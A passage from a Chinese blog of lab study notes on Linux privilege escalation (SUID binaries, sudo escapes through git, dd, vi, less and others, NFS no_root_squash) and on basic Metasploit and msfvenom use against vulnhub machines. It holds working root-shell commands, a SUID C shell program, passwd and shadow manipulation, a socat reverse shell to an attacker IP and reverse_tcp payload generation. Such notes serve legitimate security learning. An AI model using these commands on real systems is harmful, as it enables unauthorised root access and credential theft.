<p>首先用openssl生成一个密码。passwd参数代表生成一个密码，-1为md5，-salt指定盐（随意指定），最后跟要加密的值，也就是密码abcd。</p>
<p><img src="/2022/05/31/daily/image-20220830133504874.png" alt="image-20220830133504874"></p>
<p>然后按照etc/passwd的格式添加一个新用户，权限按root的写即可。</p>
<p><img src="/2022/05/31/daily/image-20220830133645874.png" alt="image-20220830133645874"></p>
<p>添加后我们用cp再把文件复制回去进行替换，此时就添加了一个abcd用户，权限为root。</p>
<p><img src="/2022/05/31/daily/image-20220830133656254.png" alt="image-20220830133656254"></p>
<h5 id="（3）利用Vim获取root权限shell"><a href="#（3）利用Vim获取root权限shell" class="headerlink" title="（3）利用Vim获取root权限shell"></a>（3）利用Vim获取root权限shell</h5><p>vim在有SUID权限的情况下，也可用来进行提权操作。</p>
<p><img src="/2022/05/31/daily/image-20220830134124700.png" alt="image-20220830134124700"></p>
<p>当vim被赋予suid权限后，意味着任何用户都可以使用vim命令来编辑那些只能由root编辑的文件，例如通过vim来编辑etc/sudoers文件（普通用户会被直接拒绝访问），在sudoers文件中配置普通用户的权限，权限和root一样，这里以test用户为例，添加如下内容：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">test   </span>ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure></div>

<p>vim编辑后保存时用wq!强制保存，vim运行时虽然是root权限，但wq依然会提示只读。</p>
<p>随后sudo bash就会获取一个root的shell。</p>
<p><img src="/2022/05/31/daily/image-20220830134159252.png" alt="image-20220830134159252"></p>
<h5 id="（4）利用脚本获取root权限shell"><a href="#（4）利用脚本获取root权限shell" class="headerlink" title="（4）利用脚本获取root权限shell"></a>（4）利用脚本获取root权限shell</h5><p>除了系统的一些可执行命令，自己写的可执行文件也可添加SUID权限。不论c或者go或者其他语言都可以，这里以c为例。</p>
<p>示例代码如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setuid(geteuid());</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用gcc进行编译。</p>
<p><img src="/2022/05/31/daily/image-20220830134227202.png" alt="image-20220830134227202"></p>
<p>编译后传入目标机，这里放到bin/aaa目录下，然后添加SUID权限测试。</p>
<p><img src="/2022/05/31/daily/image-20220830134236889.png" alt="image-20220830134236889"></p>
<p>普通用户执行该文件后，会返回一个root权限的shell。</p>
<p><img src="/2022/05/31/daily/image-20220830134252824.png" alt="image-20220830134252824"></p>
<h3 id="2）利用SUDO提权"><a href="#2）利用SUDO提权" class="headerlink" title="2）利用SUDO提权"></a>2）利用SUDO提权</h3><h4 id="sudo和su的区别"><a href="#sudo和su的区别" class="headerlink" title="sudo和su的区别"></a><strong>sudo和su的区别</strong></h4><p>1，sudo是以root权限去运行一个命令，su是去切换用户的身份。</p>
<p>2，sudo只要知道自己的密码即可，su需要知道被切换用户的密码。</p>
<h4 id="sudoers文件"><a href="#sudoers文件" class="headerlink" title="sudoers文件"></a><strong>sudoers文件</strong></h4><p>/etc/sudoers文件，是sudo权限的配置文件。当使用sudo接命令时，linux系统会在sudoers文件中查找当前用户，根据当前用户权限配置来决定是否可以运行相关命令。</p>
<p>例如添加test用户的相关配置：</p>
<p><img src="/2022/05/31/daily/image-20220901223741370.png" alt="image-20220901223741370"></p>
<p>格式如下：</p>
<p><img src="/2022/05/31/daily/image-20220901223808981.png" alt="image-20220901223808981"></p>
<h4 id="sudo-su-amp-amp-sudo-bash"><a href="#sudo-su-amp-amp-sudo-bash" class="headerlink" title="sudo su &amp;&amp; sudo bash"></a><strong>sudo su &amp;&amp; sudo bash</strong></h4><p>当没有对普通用户做严格的限制时，或者配置权限过大时，则可以尝试sudo su来切换到root权限。</p>
<p><img src="/2022/05/31/daily/image-20220901223824172.png" alt="image-20220901223824172"></p>
<p>或者执行sudo bash。</p>
<p><img src="/2022/05/31/daily/image-20220901223837242.png" alt="image-20220901223837242"></p>
<p>当visudo命令不能用时，限制了部分命令，则可以尝试下vim是否被禁用，sudo vim也可以编辑sudoers文件，且wq!可以成功保存。</p>
<h5 id="SUDO-dd-提权法"><a href="#SUDO-dd-提权法" class="headerlink" title="*SUDO -dd 提权法"></a>*SUDO -dd 提权法</h5><p><a href="https://www.cnblogs.com/zlgxzswjy/p/12746160.html">原文</a>            </p>
<p>当用户可以通过sudo执行dd命令时，可以被用来提权。通过dd命令覆盖原始/etc/passwd文件，以达到修改密码的目的</p>
<p>1、创建一个已知密码的hash，以备替换时使用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/etc</span><span class="variable">$ </span>openssl passwd <span class="number">-1</span> -salt <span class="number">123</span> password </span><br><span class="line"><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="title class_">KRa5a</span>.</span><br></pre></td></tr></table></figure></div>

<p>2、备份原始passwd文件，以防修改错误时无法访问</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line"># cp <span class="regexp">/etc/</span>passwd <span class="regexp">/tmp/</span>passwd</span><br></pre></td></tr></table></figure></div>

<p>3、利用第一步里生成的hash构建新的passwd hash条目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment"># cat passwd</span></span><br><span class="line"><span class="symbol">root:</span><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="symbol">KRa5a.:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure></div>

<p>4、使用dd覆盖原始passwd文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hh</span>@hh:/tmp$ cat passwd|sudo dd of=/etc/passwd </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records in </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records out</span><br><span class="line"><span class="attribute">1757</span> bytes (<span class="number">1</span>.<span class="number">8</span> kB, <span class="number">1</span>.<span class="number">7</span> KiB) copied, <span class="number">0</span>.<span class="number">000397129</span> s, <span class="number">4</span>.<span class="number">4</span> MB/s</span><br></pre></td></tr></table></figure></div>

<p>5、使用刚才创建hash时使用的密码进行登录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="variable">$su</span> root</span><br><span class="line"><span class="symbol">Password:</span></span><br><span class="line">root<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>提权成功！</p>
<h5 id="GIT"><a href="#GIT" class="headerlink" title="*GIT"></a>*GIT</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入sudo -l</span><br><span class="line"><span class="regexp">//</span>列出目前用户可执行与无法执行的指令。</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220901112624228.png" alt="image-20220901112624228"></p>
<p><u>就可以发现root以nopasswd【不需要密码】运行git命令</u></p>
<p>原理是git存在缓存区溢出漏洞，</p>
<p>在使用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure></div>

<p>不需要输入root密码，即可以root身份执行这条命令</p>
<p>操作如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">sudo git -p     </span><br><span class="line"><span class="regexp">//</span>-p是分页查看，这个原理就是终端的窗口大小不够显示，所以下方会出现冒号，等待输入命令</span><br></pre></td></tr></table></figure></div>

<p>下面可以看看区别</p>
<h6 id="注意"><a href="#注意" class="headerlink" title="*注意"></a>*注意</h6><p>1.窗口足够大</p>
<p><img src="/2022/05/31/daily/image-20220901113721300.png" alt="image-20220901113721300"></p>
<p>可以看到显示完了，就有回到原处了</p>
<p>2.窗口小一些</p>
<p><img src="/2022/05/31/daily/image-20220901113851826.png" alt="image-20220901113851826"></p>
<p>下方就显示出:，等待输入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">**:是自带有的，不是输入的</span><br><span class="line">:!/bin/sh    //感叹号!是shell转义字符，所以要避免sudo授权用户使用vi，vim，ftp，lee，more，git</span><br><span class="line">进入root</span><br><span class="line"><span class="section">cd /root</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">当然也可以执行:!passwd root</span><br><span class="line">修改其密码</span><br><span class="line">然后su root登录也可</span><br></pre></td></tr></table></figure></div>

<h6 id="1-执行命令，拿到root的shell"><a href="#1-执行命令，拿到root的shell" class="headerlink" title="1.执行命令，拿到root的shell"></a>1.执行命令，拿到root的shell</h6><p>$变成#成功</p>
<p><img src="/2022/05/31/daily/image-20220901114902493.png" alt="image-20220901114902493"></p>
<h6 id="2-修改密码，登录"><a href="#2-修改密码，登录" class="headerlink" title="2.修改密码，登录"></a>2.修改密码，登录</h6><p><img src="/2022/05/31/daily/image-20220901114453769.png" alt="image-20220901114453769"></p>
<p>$变成#，成功登录</p>
<p><img src="/2022/05/31/daily/image-20220901114726423.png" alt="image-20220901114726423"></p>
<h5 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a><strong>其他命令</strong></h5><p>也有很多其他命令可以用来提权，和之前的SUID提权中说的命令类似，例如sudo允许find命令，则可以通过exec参数来切换到root权限。</p>
<p>这里添加新用户aaa，并修改sudoers文件，允许部分命令，内容如下。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">aaa  ALL=(ALL:ALL) <span class="regexp">/usr/</span>bin<span class="regexp">/find,/u</span>sr<span class="regexp">/bin/</span>perl,<span class="regexp">/usr/</span>bin<span class="regexp">/python3,/u</span>sr<span class="regexp">/bin/</span>less,<span class="regexp">/usr/</span>bin<span class="regexp">/awk,/u</span>sr<span class="regexp">/bin/m</span>an,<span class="regexp">/usr/</span>bin/vi</span><br></pre></td></tr></table></figure></div>



<p>这时aaa用户使用sudo就只能执行配置好的命令，sudo su和sudo bash被禁止执行。</p>
<p><img src="/2022/05/31/daily/image-20220901224325691.png" alt="image-20220901224325691"></p>
<p>相关命令提权方式如下：</p>
<h6 id="find："><a href="#find：" class="headerlink" title="find："></a>find：</h6><p>exec参数用来指定搜索结果的处理命令，需要以分号结尾，分号在命令行有特殊函数，要用\进行转义。</p>
<p><img src="/2022/05/31/daily/image-20220901224342169.png" alt="image-20220901224342169"></p>
<h6 id="perl："><a href="#perl：" class="headerlink" title="perl："></a>perl：</h6><p>e参数用来指定要运行的命令，然后使用linux的exec参数来调用bash。</p>
<p><img src="/2022/05/31/daily/image-20220901224356163.png" alt="image-20220901224356163"></p>
<h6 id="python："><a href="#python：" class="headerlink" title="python："></a>python：</h6><p>c参数可以在命令行执行python代码，pty库是一个伪终端库，它的spawn会调用指定的程序。</p>
<p><img src="/2022/05/31/daily/image-20220901224409127.png" alt="image-20220901224409127"></p>
<h6 id="less："><a href="#less：" class="headerlink" title="less："></a>less：</h6><p>输入sudo less /etc/hosts命令浏览文件内容时，到底部输入!bash后回车，会获得一个root权限的shell。</p>
<p><img src="/2022/05/31/daily/image-20220901224420552.png" alt="image-20220901224420552"></p>
<p><img src="/2022/05/31/daily/image-20220901224511943.png" alt="image-20220901224511943"></p>
<h6 id="awk："><a href="#awk：" class="headerlink" title="awk："></a>awk：</h6><p>通过调用linux的system函数来打开bash。</p>
<p><img src="/2022/05/31/daily/image-20220901224431624.png" alt="image-20220901224431624"></p>
<h6 id="man："><a href="#man：" class="headerlink" title="man："></a>man：</h6><p>通过sudo man man命令来打开man的使用手册，同时会进入编辑行，输入!bash回车，可获取root权限。</p>
<p><img src="/2022/05/31/daily/image-20220901224541655.png" alt="image-20220901224541655"></p>
<p><img src="/2022/05/31/daily/image-20220901224551402.png" alt="image-20220901224551402"></p>
<h6 id="vi："><a href="#vi：" class="headerlink" title="*vi："></a>*vi：</h6><p>sudo vi会进入vi默认页，输入:!bash回车，可进入root命令行。</p>
<p><img src="/2022/05/31/daily/image-20220901224609706.png" alt="image-20220901224609706"></p>
<p><img src="/2022/05/31/daily/image-20220901224622369.png" alt="image-20220901224622369"></p>
<h6 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h6><p>如果sudoers定义了可以执行某个脚本，则我们可以把返回shell的代码添加进去。</p>
<p>例如桌面有个运维需要的aaa.sh文件，我们添加一段打开bash的代码，然后sudo运行即可。</p>
<p><img src="/2022/05/31/daily/image-20220901224639423.png" alt="image-20220901224639423"></p>
<p>参考代码：</p>
<p><img src="/2022/05/31/daily/image-20220901224909264.png" alt="image-20220901224909264"></p>
<h5 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a><strong>应用程序</strong></h5><p>除了上面的一些二进制文件，一些应用程序也可以获取root权限，例如env、ftp、socat、scp。</p>
<p><img src="/2022/05/31/daily/image-20220901225004858.png" alt="image-20220901225004858"></p>
<h6 id="env："><a href="#env：" class="headerlink" title="env："></a>env：</h6><p>通过env环境变量来获取root权限。</p>
<p><img src="/2022/05/31/daily/image-20220901225022285.png" alt="image-20220901225022285"></p>
<h6 id="ftp："><a href="#ftp：" class="headerlink" title="ftp："></a>ftp：</h6><p>通过ftp来进入bash获取root权限。</p>
<p><img src="/2022/05/31/daily/image-20220901225031965.png" alt="image-20220901225031965"></p>
<h6 id="socat："><a href="#socat：" class="headerlink" title="socat："></a>socat：</h6><p>通过socat客户端连接攻击机，攻击机可获得rootshell。先执行服务端，后执行客户端。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">sudo socat <span class="built_in">exec</span>:<span class="string">&#x27;sh -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.23.128:4444</span><br><span class="line">攻击机执行：</span><br><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure></div>



<p><img src="/2022/05/31/daily/image-20220901225047468.png" alt="image-20220901225047468"></p>
<p><img src="/2022/05/31/daily/image-20220901225056003.png" alt="image-20220901225056003"></p>
<h6 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h6><p>还有一个scp，scp是一个安全复制文件的命令，它无法获取一个shell，但可以用来复制一些系统的敏感文件。例如etc/passwd、etc/shadow等。</p>
<p>如下命令，将passwd文件传输到指定机器的root/Desktop下，然后再对密码进行破解等操作。</p>
<p><img src="/2022/05/31/daily/image-20220901225110501.png" alt="image-20220901225110501"></p>
<h5 id="黑名单情况"><a href="#黑名单情况" class="headerlink" title="黑名单情况"></a><strong>黑名单情况</strong></h5><p>如果碰到sudoers文件使用黑名单的情况，比如说权限禁用sudo使用find命令，但是都是在ALL基础上设置的，那么可以cp把find复制到其它目录运行。</p>
<p><img src="/2022/05/31/daily/image-20220901225127772.png" alt="image-20220901225127772"></p>
<h3 id="3-NFS配置不当导致提权"><a href="#3-NFS配置不当导致提权" class="headerlink" title="3) NFS配置不当导致提权"></a>3) NFS配置不当导致提权</h3><h4 id="NFS介绍"><a href="#NFS介绍" class="headerlink" title="NFS介绍"></a>NFS介绍</h4><p>NFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享。</p>
<p>这里以ubuntu为例，简单配置一下：</p>
<p>首先安装nfs服务端：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install nfs-kernel-<span class="keyword">server</span></span><br></pre></td></tr></table></figure></div>



<p>安装后修改配置文件/etc/exports，这里将home目录进行挂载共享，内容如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line">/home *(rw,no_root_squash)</span><br></pre></td></tr></table></figure></div>



<p>其中/home是要挂载的目录，*代表允许连接的主机，这里是所有，rw是读写权限，no_root_squash代表客户端允许以root权限访问nfs。</p>
<p>随后重启相关服务：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line"># nfs通过rpc通信，这里把rpcbind也重启下sudo <span class="regexp">/etc/i</span>nit.d<span class="regexp">/rpcbind restartsudo /</span>etc<span class="regexp">/init.d/</span>nfs-kernel-server restart</span><br></pre></td></tr></table></figure></div>



<p>此时就配置好了，可以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。</p>
<p><img src="/2022/05/31/daily/image-20220901231323392.png" alt="image-20220901231323392"></p>
<p>或者通过nmap的相关脚本来进行扫描。</p>
<p><img src="/2022/05/31/daily/image-20220901231334381.png" alt="image-20220901231334381"></p>
<h4 id="NFS配置不当可提权"><a href="#NFS配置不当可提权" class="headerlink" title="NFS配置不当可提权"></a><strong>NFS配置不当可提权</strong></h4><p>当nfs配置了读写权限，且允许客户端以root访问时，就会存在安全隐患。测试如下：</p>
<p>首先客户端把目标机nfs的共享挂载到本地，然后把bash复制进去并赋予suid权限，操作如下图。</p>
<p><img src="/2022/05/31/daily/image-20220901231351979.png" alt="image-20220901231351979"></p>
<p>此时目标机的home目录下就会有一个具有suid权限的bash。</p>
<p>普通用户执行即可获取root权限，这里注意需要加上p参数，否则权限还是当前用户的。</p>
<p>p参数说明：不提供的情况下，打开bash权限是当前实际用户，提供的情况下，会打开特权模式，像上继承euid，因为bash有suid权限，所以这里是root。</p>
<p><img src="/2022/05/31/daily/image-20220901231410196.png" alt="image-20220901231410196"></p>
<p>使用场景：这个和suid提权很像，给程序赋予suid权限然后利用。不同的是前两篇suid提权是当前用户使用sudo  chmod自己修改的，在sudoers禁用sudo命令等情况下，就行不通了。而nfs配置利用，是客户端挂载到本地赋权的，目标机的普通用户只需执行就可以。</p>
<p>同理，之前总结的suid提权的那些程序也同样适用，这里就不再记了。</p>
<h4 id="其它命令"><a href="#其它命令" class="headerlink" title="其它命令"></a><strong>其它命令</strong></h4><p>除了可以直接得到shell的，还有其他一些程序不能直接获取，例如nano、vi等。</p>
<p><img src="/2022/05/31/daily/image-20220901231423093.png" alt="image-20220901231423093"></p>
<p>然后使用nano -p来读取shadow文件，这里读取时把相关记录复制出来，使用john破解，测试不能重定向，需要权限，所以只能复制。</p>
<p><img src="/2022/05/31/daily/image-20220901231435125.png" alt="image-20220901231435125"></p>
<p>复制后使用john破解获取相关用户密码，以root为例，密码是root。</p>
<p><img src="/2022/05/31/daily/image-20220901231451129.png" alt="image-20220901231451129"></p>
<p>如果密码太复杂，破解不了，则可以尝试其它用户，例如我这里目标机是aaa用户，破解aaa密码为aaa。</p>
<p><img src="/2022/05/31/daily/image-20220901231505353.png" alt="image-20220901231505353"></p>
<p>这时候不确定aaa是否为root权限，则可以继续使用nano去编辑passwd文件，给aaa赋权。</p>
<p>把原来的1001换成0.</p>
<p><img src="/2022/05/31/daily/image-20220901231516388.png" alt="image-20220901231516388"></p>
<p>然后切换aaa用户即可。</p>
<p><img src="/2022/05/31/daily/image-20220901231524654.png" alt="image-20220901231524654"></p>
<p>利用这种机制，也可以用来修改sudoers文件，添加或修改为以下内容。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">aaa     <span class="keyword">ALL</span>=(<span class="keyword">ALL</span>:<span class="keyword">ALL</span>) NOPASSWD:<span class="keyword">ALL</span></span><br></pre></td></tr></table></figure></div>



<p>然后使用sudo bash或sudo su获取root权限。</p>
<p><img src="/2022/05/31/daily/image-20220901231537204.png" alt="image-20220901231537204"></p>
<hr>
<h2 id="6-记录一下打靶场的时候，一些kali工具的使用"><a href="#6-记录一下打靶场的时候，一些kali工具的使用" class="headerlink" title="6.记录一下打靶场的时候，一些kali工具的使用"></a>6.记录一下打靶场的时候，一些kali工具的使用</h2><h3 id="1）msf"><a href="#1）msf" class="headerlink" title="1）msf"></a>1）msf</h3><h4 id="（1）msf基本使用"><a href="#（1）msf基本使用" class="headerlink" title="（1）msf基本使用"></a>（1）msf基本使用</h4><p><code>一个漏洞利用框架,对计算机软件漏洞进行攻击</code></p>
<p><strong>这里以vulnhub dc1为例</strong></p>
<p>终端输入<code>msfconsole</code>，进入msf界面，或者菜单也可以打开</p>
<p><img src="/2022/05/31/daily/image-20220830094506049.png" alt="image-20220830094506049"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入search drupal，找一下有没有drupal可以利用的脚本</span><br><span class="line"><span class="regexp">/*对于其他命令，可以用help查询*/</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830094939297.png" alt="image-20220830094939297"></p>
<p>这里可以选择不同的脚本，下面以编号1的脚本为例，其他的应该也可以</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACTIONSCRIPT"><figure class="iseeu highlight /actionscript"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">use</span> <span class="number">1</span>，进入编号<span class="number">1</span>脚本的运行环境</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830095106784.png" alt="image-20220830095106784"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">show</span> <span class="keyword">options</span>,查看脚本运行的所需要配置的项目</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830105519336.png" alt="image-20220830105519336"></p>
<p><code>Required</code>是要求填的，yes是必填项，no是非必填项</p>
<p>这里的<code>RHOSTS</code>没有填，这里是要求填入<code>target hosts</code>也就是目标地址，也就是我们靶机的地址</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">set</span> RHOSTS <span class="comment">192.168.133.136</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830110143969.png" alt="image-20220830110143969"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">再输入<span class="built_in">run</span>，运行脚本</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830110303594.png" alt="image-20220830110303594"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">shell</span>，进入<span class="built_in">shell</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830110551273.png" alt="image-20220830110551273"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">whoami</span>，查看当前的权限</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830110648417.png" alt="image-20220830110648417"></p>
<p>发现是个低权限的账号</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">ls</span>，可以查看到当前的目录文件</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830110825217.png" alt="image-20220830110825217"></p>
<p>但是一堆东西挤在一起，还是有些不太方便</p>
<p><strong>输入下方指令，利用python进入交互式shell【固定姿势，要记住】</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830110907408.png" alt="image-20220830110907408"></p>
<h4 id="（2）msf后门生成模块"><a href="#（2）msf后门生成模块" class="headerlink" title="（2）msf后门生成模块"></a>（2）msf后门生成模块</h4><h5 id="普通生成"><a href="#普通生成" class="headerlink" title="普通生成"></a>普通生成</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">msfvenom -p 有效载荷 -f 输出格式 -o 输出文件</span><br><span class="line"></span><br><span class="line">msfvenom -p windows<span class="regexp">/meterpreter/</span>reverse_tcp -f exe -o payload.exe</span><br></pre></td></tr></table></figure></div>

<h5 id="编码生成"><a href="#编码生成" class="headerlink" title="编码生成"></a>编码生成</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 <span class="attribute">lhost</span>=攻击机IP <span class="attribute">lport</span>=攻击机端口 -e 编码方式 -i编码次数 -f 输出格式 -o 输出文件</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="attribute">lhost</span>=192.168.1.1 <span class="attribute">lport</span>=8888 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe</span><br></pre></td></tr></table></figure></div>

<h5 id="以DC-3举个例子"><a href="#以DC-3举个例子" class="headerlink" title="*以DC-3举个例子"></a>*以DC-3举个例子</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入msfvenom -p php<span class="regexp">/meterpreter/</span>reverse_tcp LHOST=kali的ip LPORT=<span class="number">4444</span> -f raw &gt; shell.php</span><br><span class="line"><span class="regexp">//</span>注意，LHOST是kali的ip</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220903222910397.png" alt="image-20220903222910397"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">ls</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220903144052531.png" alt="image-20220903144052531"></p>
<p>发现目录下生成了 <code>shell.php</code></p>
